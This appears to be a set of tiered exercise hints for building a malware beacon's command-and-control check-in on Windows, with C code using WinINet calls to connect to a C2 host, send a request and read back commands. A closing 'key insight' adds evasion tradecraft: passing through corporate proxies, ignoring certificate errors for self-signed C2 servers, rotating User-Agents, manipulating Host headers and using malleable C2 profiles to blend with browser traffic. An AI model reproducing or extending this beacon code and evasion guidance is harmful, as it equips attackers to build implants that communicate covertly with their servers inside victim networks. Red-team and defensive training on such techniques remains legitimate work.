=== HINT 1 ===
HINTERNET hInet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG,
                                 NULL, NULL, 0);

=== HINT 2 ===
HINTERNET hConn = InternetConnectA(hInet, C2_HOST, C2_PORT,
                                    NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);


HINTERNET hReq = HttpOpenRequestA(hConn, "GET", C2_PATH, NULL, NULL, NULL, 0, 0);


BOOL sent = HttpSendRequestA(hReq, NULL, 0, NULL, 0);
char buf[512] = {0};
DWORD read = 0;
InternetReadFile(hReq, buf, sizeof(buf)-1, &read);

=== HINT 3 (SPOILER) ===
InternetCloseHandle(hReq);
InternetCloseHandle(hConn);
InternetCloseHandle(hInet);

=== KEY INSIGHT ===
INTERNET_OPEN_TYPE_PRECONFIG reads the system/IE proxy settings automatically -
important for beacons operating behind corporate proxies.
For HTTPS: add INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID to
HttpOpenRequestA flags (ignore cert errors for self-signed C2 certs).
WinHTTP (winhttp.dll) is the modern alternative: doesn't use IE proxy settings,
suitable for services/non-interactive processes.
Real beacons add custom headers (User-Agent rotation, Host header manipulation,
malleable C2 profiles) to blend with legitimate browser traffic.
